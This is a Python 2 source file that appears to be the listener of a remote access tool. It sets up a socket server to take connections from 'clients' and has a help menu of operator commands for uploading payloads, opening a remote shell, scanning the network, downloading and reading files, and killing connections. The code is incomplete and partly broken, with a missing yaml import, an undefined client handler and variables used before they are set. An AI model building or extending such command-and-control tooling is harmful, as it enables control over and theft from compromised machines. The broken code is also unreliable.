#!/usr/bin/Python2.7.12
import socket
import sys
import getopt
import threading
import subprocess
from var import *
from banner import banner

COMMANDS = ['help', 'client', 'clients', 'upload', 'shell', 'pwd', 'exit', 'kill', 'scan', 'ls',
            'system', 'wget', 'cat', 'crypt']
HELP = '''
    -h --help           --Show the help menu
    -c --client [ID]    --Connect to client using <client ID>
    -clients            --Show all connected clients
    -u --upload         --Upload file, executable, payload etc.
    -shell              --Open shell and execute commands
    -pwd                --Show the working directory
    -exit               --Exit the server and keep all clients alive
    -end                --Kill current connection
    -kill               --Kill all active connections
    -scan               --Scan the network
    -ls                 --List all files in the current directory
    -system             --Show all current system information
    -wget               --Download file from web
    -cat [FileName]     --Read file
    -crypt              --Generate crypto key
    '''

banner()
print "[*] Spining up server on: " + host + " port: " + server_port + " [*]"
#print target
#print host
print HELP


def server_loop():

    with open("_config.yaml", "r") as config:
        cfg = yaml.load(config)

    host = cfg["server"]["host"]
    num = cfg["server"]["port"]
    port = int(num)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        sock.listen(100)
        print "[+] Listening for connection ..."
        client, addr = sock.accept()
    except Exception, e:
        print "[-] Connection Failed: " + str(e)
        sys.exit(1)
    print "[+] Connection Established!"

    while True:

        client_socket, addr = sock.accept()
        # spin off thread to handle our new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

server_loop()
